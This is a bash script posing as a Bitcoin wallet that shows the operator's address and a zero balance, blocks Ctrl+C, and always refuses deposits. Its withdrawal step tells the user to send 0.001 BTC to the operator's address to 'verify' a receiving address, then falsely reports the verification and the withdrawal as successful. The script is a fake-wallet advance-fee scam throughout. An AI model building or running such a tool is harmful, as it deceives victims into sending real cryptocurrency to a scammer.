#!/bin/bash

ADDRESS="ADDRESS GOES HERE"
FUNDS=0

# Define color codes
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Trap Ctrl+C interrupt to prevent exiting
trap '' SIGINT

# Function to display the header
display_header() {
    clear
    echo -e "${GREEN}==============================="
    echo -e "        Bitcoin Wallet         "
    echo -e "==============================="
    echo -e "ADDRESS: $ADDRESS"
    echo -e "FUNDS: ${YELLOW}$FUNDS BTC${NC}"
    echo -e "===============================${NC}"
}

# Function to display the main menu
display_menu() {
    echo -e "${GREEN}1. Deposit Funds${NC}"
    echo -e "${GREEN}2. Withdraw Funds${NC}"
    echo -e "${GREEN}3. Exit${NC}"
    echo -e "${GREEN}===============================${NC}"
}

# Function to handle user input for deposit
deposit_funds() {
    echo -e "${GREEN}==============================="
    echo -e "         Deposit Funds         "
    echo -e "==============================="
    read -p "Enter amount to deposit: " amount
    if [[ $amount =~ ^[0-9]+$ ]]; then
        echo "Deposits are currently unavailable. Please try again later or contact support for assistance."
    else
        echo "Invalid input. Please enter a valid number."
    fi
    read -p "Press Enter to continue..."
}

# Function to handle user input for withdraw
withdraw_funds() {
    while true; do
        display_header
        echo -e "${GREEN}1. Withdraw Funds${NC}"
        echo -e "${GREEN}2. Go Back${NC}"
        echo -e "${GREEN}===============================${NC}"
        read -p "Enter your choice: " choice
        case $choice in
            1)
                clear
                echo -e "${GREEN}==============================="
                echo -e "         Withdraw Funds         "
                echo -e "==============================="
                read -p "Enter amount to withdraw: " amount
                # Check if the input is a valid number
                if [[ $amount =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
                    # Check if the amount is greater than the available funds
                    if (( $(echo "$amount > $FUNDS" | bc -l) )); then
                        echo -e "${RED}Error: Insufficient funds.${NC}"
                        sleep 2  # Delay for 2 seconds before clearing screen
                        return 1
                    else
                        read -p "Enter deposit address: " deposit_address
                        if (( ${#deposit_address} < 30 )); then
                            echo -e "${RED}Error: Deposit address is invalid!${NC}"
                            sleep 2  # Delay for 2 seconds before clearing screen
                            return 2
                        else
                            echo -e "${GREEN}Please deposit ${YELLOW}0.001 BTC${NC}\ninto the main address ${CYAN}$ADDRESS${NC}\nto confirm the authenticity\nof the receiving address ${CYAN}$deposit_address${NC}.${NC}"
                            read -p "Once deposited, press Enter to continue..."
                            echo -e "${GREEN}Verification successful. Proceeding with withdrawal.${NC}"
                            echo -e "Withdrawal of $amount funds to $deposit_address ${GREEN}successful.${NC}"
                            sleep 2  # Delay for 2 seconds before clearing screen
                            return 0
                        fi
                    fi
                else
                    echo -e "${RED}Error: Invalid input. Please enter a valid number.${NC}"
                    sleep 2  # Delay for 2 seconds before clearing screen
                    return 3
                fi
                ;;
            2)
                return
                ;;
            *)
                echo -e "${RED}Error: Invalid choice. Please enter 1 or 2.${NC}"
                sleep 2  # Delay for 2 seconds before clearing screen
                return 4
                ;;
        esac
    done
}




# Main loop to display menu and handle user input
while true; do
    display_header
    display_menu
    read -p "Enter your choice: " choice
    case $choice in
        1)
            deposit_funds
            ;;
        2)
            withdraw_funds
            ;;
        3 )
            exit
            ;;
    esac
done
